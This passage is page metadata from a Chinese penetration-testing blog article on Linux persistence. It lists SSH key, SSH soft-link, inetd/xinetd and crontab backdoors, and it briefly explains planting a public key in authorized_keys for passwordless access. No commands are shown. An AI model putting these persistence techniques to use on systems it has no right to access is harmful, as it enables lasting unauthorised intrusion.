ssh连接，对...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"Linux权限维持"}],["meta",{"property":"og:description","content":"ssh公钥免密后门 公钥私钥原理概述 公钥和私钥同时生成，公钥用于加密，私钥用于解密。公钥可以有很多人持有，但是私钥只能自己持有，在ssh服务中，将客户端生成的ssh公钥写到目标服务器的 ~/.ssh/authorized keys中,之后客户端利用私钥完成认证即可登录 该后门比较容易被发现(查看/root/.ssh/有几个公钥)。 ★ ssh连接，对..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"Linux权限维持"}],["meta",{"property":"article:published_time","content":"2023-09-01T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Linux权限维持\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-09-01T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"ssh公钥免密后门","slug":"ssh公钥免密后门","link":"#ssh公钥免密后门","children":[{"level":3,"title":"公钥私钥原理概述","slug":"公钥私钥原理概述","link":"#公钥私钥原理概述","children":[]},{"level":3,"title":"ssh公钥免密实现步骤","slug":"ssh公钥免密实现步骤","link":"#ssh公钥免密实现步骤","children":[]}]},{"level":2,"title":"ssh软连接后门","slug":"ssh软连接后门","link":"#ssh软连接后门","children":[{"level":3,"title":"ssh软连接后门原理","slug":"ssh软连接后门原理","link":"#ssh软连接后门原理","children":[]},{"level":3,"title":"ssh软连接后门制作","slug":"ssh软连接后门制作","link":"#ssh软连接后门制作","children":[]}]},{"level":2,"title":"inetd/xinetd 后门","slug":"inetd-xinetd-后门","link":"#inetd-xinetd-后门","children":[]},{"level":2,"title":"Crontab 计划任务后门","slug":"crontab-计划任务后门","link":"#crontab-计划任务后门","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":5.84,"words":1751},"filePathRelative":"perm/权限提升/Linux权限维持.md","localizedDate":"2023年9月1日","excerpt":"<h2>ssh公钥免密后门</h2>\\n<h3>公钥私钥原理概述</h3>\\n<p>公钥和私钥同时生成，<strong>公钥用于加密，私钥用于解密</strong>。公钥可以有很多人持有，但是私钥只能自己持有，在ssh服务中，将客户端生成的ssh公钥写到目标服务器的 ~/.ssh/authorized keys中,之后客户端利用私钥完成认证即可登录 <span data-type=\\"text\\" style=\\"color: var(--b3-font-color8);\\">该后门比较容易被发现(查看/root/.ssh/有几个公钥)。</span></p>\\n<p>★ ssh连接，对方开启ssh需要对方密码才可登录，但如果写入公钥，不用密码就可以登录。</p>","autoDesc":true}')}}]);